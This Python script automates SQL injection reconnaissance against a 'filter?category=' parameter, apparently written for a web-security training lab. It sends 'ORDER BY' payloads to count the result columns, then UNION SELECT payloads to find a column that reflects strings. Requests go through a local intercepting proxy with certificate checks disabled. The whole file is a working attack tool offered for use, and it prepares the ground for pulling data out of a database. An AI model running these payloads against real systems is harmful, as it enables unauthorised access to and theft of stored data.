import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    uri = "filter?category="
    order = int(sys.argv[2]) + 1
    for i in range(1,order):
        payload = f"'+order+by+{i}--+-"
        request = requests.get(url + uri + payload, verify=False, proxies=proxies)
        response = request.text
        if "Internal Server Error" in  response:
            return (i - 1)
    return False

def stringField(url, column):
    uri = "filter?category="
    for i in range(1,column+1):
        value = f"'{sys.argv[3]}'"
        payloadList = ['null'] * column
        payloadList[i-1] = value
        sql = f"' union select {','.join(payloadList)}-- -"
        request = requests.get(url + uri + sql, verify=False, proxies=proxies)
        response = request.text
        if "Internal Server Error" not in response:
           return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[!] syntax-error: {sys.argv[0]} <url> <range> <int/str>")
        sys.exit(1)
    print("[?] calculating...")
    numCol = exploit(url)
    if numCol:
        print(f"[+] detected: [{numCol}]")
        print("[?] locating...")
        strCol = stringField(url, numCol)
        if strCol:
            print(f"[+] changeable: [{strCol}]")
        else:
            print("[-] status: [nil value]")
    else:
        print("[-] status: [failure]")
